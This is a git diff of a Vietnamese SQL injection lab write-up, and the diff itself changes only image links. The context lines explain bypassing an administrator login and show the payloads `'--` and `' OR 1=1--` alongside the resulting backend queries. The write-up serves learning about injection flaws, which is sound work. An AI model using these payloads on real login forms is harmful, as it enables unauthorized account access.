@@ -1,4 +1,4 @@
-![[Pasted image 20260520185130.png]]
+![SQLi Lab](images/Pasted%20image%2020260520185130.png)
 # Tổng quan về lab
 -Mục tiêu là làm sao để bypass đăng nhập vào tài khoản administrator
 Thường thường khi đăng nhập kết nối với MySQL ta biết SQL có câu truy vấn
@@ -15,7 +15,7 @@ SELECT * FROM users
 WHERE username = 'administrator' AND password = 'kobietmatkhau'
 ```
 bằng cách thêm `'--` trước administrator 
-![[Pasted image 20260520185721.png]]
+![SQLi Lab](images/Pasted%20image%2020260520185721.png)
 Lúc này câu query Backend trở thành:
 ```SQL
 SELECT * FROM users 
@@ -30,7 +30,7 @@ SELECT * FROM users
 WHERE username = 'administrator' AND password = 'kobietmatkhau'
 ```
 bằng cách thêm `' OR 1=1--` trước administrator hoặc password
-![[Pasted image 20260520190140.png]]
+![SQLi Lab](images/Pasted%20image%2020260520190140.png)
 Lúc này câu query Backend trở thành:
 ```SQL
 SELECT * FROM users 
